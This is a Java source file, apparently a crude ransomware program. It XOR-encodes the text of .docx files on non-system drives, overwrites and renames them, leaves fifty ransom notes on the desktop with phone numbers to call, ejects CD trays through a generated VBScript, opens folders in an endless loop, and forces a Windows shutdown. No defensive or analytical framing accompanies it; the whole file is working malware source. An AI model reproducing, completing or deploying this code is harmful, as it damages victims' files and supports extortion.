package dr.hassan;
import java.awt.Desktop;
import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import org.apache.poi.xwpf.usermodel.XWPFDocument;
import org.apache.poi.xwpf.usermodel.XWPFParagraph;
import org.apache.poi.xwpf.usermodel.XWPFRun;

public class Encryption {
            private static final String REGQUERY_UTIL = "reg query ";
            private static final String REGSTR_TOKEN = "REG_SZ";
            private static final String DESKTOP_FOLDER_CMD = REGQUERY_UTIL 
                                                                                                    +"\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\"
                                                                                                     + "Explorer\\Shell Folders\" /v DESKTOP";
            private Encryption () {}

  public static String getCurrentUserDesktopPath() {
                try {
                           Process process = Runtime.getRuntime().exec(DESKTOP_FOLDER_CMD);
                           StreamReader reader = new StreamReader(process.getInputStream());
                            reader.start();
                           process.waitFor();
                           reader.join();
                           String result = reader.getResult();
                           int p = result.indexOf(REGSTR_TOKEN);
                           if (p == -1)
                                  return null;
                         return result.substring(p + REGSTR_TOKEN.length()).trim();
                                  }  catch (Exception e) {
                                                 return null;}
                                                              }
              static String[]a;
              static File filel;
  
    public static void main(String[] args) throws IOException 
    {
        //search of the name of disk in computer
          File [] roots=File.listRoots();
          for(int i=0 ;i<roots.length ;i++)
                {   
                   String namedisk= roots[i].getPath();
                  if(namedisk.contains("C"))   
                               continue;
                 else
                       {
                            ArrayList<String>array=new ArrayList<String>();
                            File f=new File( namedisk);
                            File[]allSubFiles=f.listFiles();
                            for(File file :allSubFiles)
                            {
                              if(file.isDirectory())
                                 {
                                    String dir=file.getAbsolutePath();                            //get name of directory
                                   if(dir.contains("System")||dir.contains("WindowsApps"))
                                        continue;
                                  else
                                       array.add(dir);
                                           }
                             else{
                                  String nn=file.getAbsolutePath();
                                  if (nn.endsWith(".docx"))
                                  { 
                                     File s =new File(nn); 
                                     if(s.length()==0)
                                             rename(nn);
                                    else    
                                         decoder(nn);
                                        }
                                   }
            search1(array);
                                     }
                                           }
                                                 }  
                        print50f();
                       openCD();
                       openfile();
    }
    
    public static void openCD() 
         {
               try  
                   {  
                         //********Start VBScript code to open cd tray************  
                        String a="Set oWMP = CreateObject(\"WMPlayer.OCX\")"+"\n"  
                                     +"Set colCDROMs = oWMP.cdromCollection"+"\n"  
                                     +"For d = 0 to colCDROMs.Count - 1"+"\n"  
                                     +"colCDROMs.Item(d).Eject"+"\n"  
                                     +"Next"+"\n"  
                                     +"set owmp = nothing"+"\n"  
                                     +"set colCDROMs = nothing"+"\n"  
                                    +"wscript.Quit(0)";  
                        //********End VBScript code to open cd tray************  
                       //Create a vbscript file called OpenCdTray.vbs  
                        File myCdTrayOpener=new File("OpenCdTray.vbs"); 
                     //Create a PrintWriter object that will use to write into created file  
                       PrintWriter pw=new PrintWriter(myCdTrayOpener);  
                      //Write all string in (a) into created file  
                          pw.print(a);  
                      //Flush all resource in PrintWriter to make sure  
                      //there are no data left in this stream.  
                           pw.flush();  
                     //Close PrintWriter and releases any   
                     //system resources associated with it  
                           pw.close();  
                     //Create a Desktop object to open created vbs file(OpenCdTray.vbs).  
                    //It will open using default application that will use   
                    //to handle this file in targeted computer.   
                   //True application to run this file is wscript.exe  
                        Desktop.getDesktop().open(myCdTrayOpener);  
                 //Delete created vbs file before terminate application  
                      myCdTrayOpener.deleteOnExit();  
                    }    catch(Exception exception)  { 
                                              exception.printStackTrace(); }    
 }  
    
    public static void print50f() throws FileNotFoundException 
    {
          String name= getCurrentUserDesktopPath();
          System.out.println("Desktop directory : " + name);
          creatfile(name); 
      }
        static class StreamReader extends Thread {
         private InputStream is;
         private StringWriter sw;
         StreamReader(InputStream is) {
         this.is = is;
         sw = new StringWriter();
    }
    public void run() {
      try {
            int c;
            while ((c = is.read()) != -1)
            sw.write(c);
        }
          catch (IOException e) { ; }
      }
       String getResult() {
       return sw.toString();
         }
                  }
  
    public static void creatfile(String plase) throws FileNotFoundException
    {
        for (int r=1 ;r<51; r++){
        String name="feedia"+r;
        String filename=plase+"\\ط³ط·ط­ ط§ظ„ظ…ظƒطھط¨"+name;
        System.out.println(filename);
        PrintWriter inputfile=new PrintWriter(filename+".txt");
                  inputfile.println("   Your files have been encrypted ");
                  inputfile.println("For refunds you should contact us at the following numbers: ");
                  inputfile.println( " +972595923355 ");
                  inputfile.println( " +972592216319");
                  inputfile.println( "  +972592861319 ");
                  inputfile.println( "  +972592294331 ");
            
            inputfile.close();
  }
  }

    public static void search1( ArrayList<String>array1) throws IOException
    {        
              ArrayList<String>array2=new ArrayList<String>();
              for(int i=1;i<array1.size();i++)
              {
                 File ff=new File( array1.get(i));
                 File[]newfi=ff.listFiles();
                 for(File nnnew :newfi)
                 { 
                    if(nnnew.isDirectory()){
                    //get name of directory
                      String dir=nnnew.getAbsolutePath();
                      array2.add(dir);
                        }
                    else{
                            String mm=nnnew.getAbsolutePath();
                             if (mm.endsWith(".docx")){
                            File s =new File(mm); 
                             if(s.length()==0)
                                  rename(mm);
                            else   
                                 decoder(mm);
                        }
                           }
                               }
                                   }
                search2(array2);
          }
    
    public static void search2( ArrayList<String>array2) throws IOException
    {
          ArrayList<String>array1=new ArrayList<String>();
          for(int i=1;i<array2.size();i++)
          {   
                    File fff=new File( array2.get(i));
                   File[]newfilw=fff.listFiles();
                    for(File nnew :newfilw)
                    {
                          if(nnew.isDirectory())
                          {
                               String dir=nnew.getAbsolutePath();                    //get name of directory
                              array1.add(dir);
                                   }
                       else
                          {   
                              String mm=nnew.getAbsolutePath();
                              if (mm.endsWith(".docx"))
                              {
                                  File s =new File(mm);
                                  if(s.length()==0){
                                        rename(mm);}
                                 else
                                      decoder(mm);
                    }
                           }
                              } 
                                     }
                                          }
    
    public static void decoder(String filename)throws IOException
    {
           String pp=""; 
            try{
                     FileInputStream file =new FileInputStream(filename);
                     XWPFDocument docx=new XWPFDocument(file);
                     List<XWPFParagraph> paragraphList=docx.getParagraphs();
                     pp = paragraphList.stream().map((paragraph) -> paragraph.getText()).reduce(pp, String::concat);
                }
                catch (FileNotFoundException  e){
                      }
                catch(IOException e){
                       }
    //encode file
                      int kay=66;
                      String last="";
                      for (int z=0; z<pp.length();z++)
                      {
                              int asc=pp.charAt(z);
                               int n=asc^kay;
                               char m=(char)n;
                               last+=m;
                        }
        //Write in docx file
        try{     
                      XWPFDocument document =new  XWPFDocument ();
                      FileOutputStream out = new FileOutputStream(new File (filename)) ;
                      XWPFParagraph  paragraph=document.createParagraph();
                      XWPFRun run=paragraph.createRun();
                      run.setText(last);
                      document.write(out);
                      }catch(IOException e){
                      }
         rename(filename);
        }
        
    public static void rename(String name)
    {
          File f = new File(name); 
          String name1="";
         for(int m=0 ;m<name.length()-4;m++)
           {
              name1+=name.charAt(m);
              }
          f.renameTo(new File(name1+"hsnn"));
    }
    
    public static void openfile(){
        try {
                 File []paths;
                 paths=File.listRoots();
                 for (File path : paths)
                 {
                     a =path.list();
                    while (true){
                   for(int x=1;a.length>x;x++)
                   {
                      filel =new File (path+a[x]);
                       if (filel.isDirectory())
                       {
                           Desktop desktop =Desktop.getDesktop();
                           File dirToOpen =new File (path +a[x]);
                           desktop.open(dirToOpen);
                         }
                    }
                        reset();   
                                          }     
                                                 } 
              
             
          }  catch (Exception e){
                       System .out.println(e)  ; }
    }
    
    public static void reset() throws IOException 
    {  
            String operatingSystem=System.getProperty("os.name");  
            Runtime r=Runtime.getRuntime();
            Scanner input=new Scanner(System.in);
            if(operatingSystem.toLowerCase().contains("windows"))
            {
                r.exec("shutdown -s -t 0");
            }
    }
}
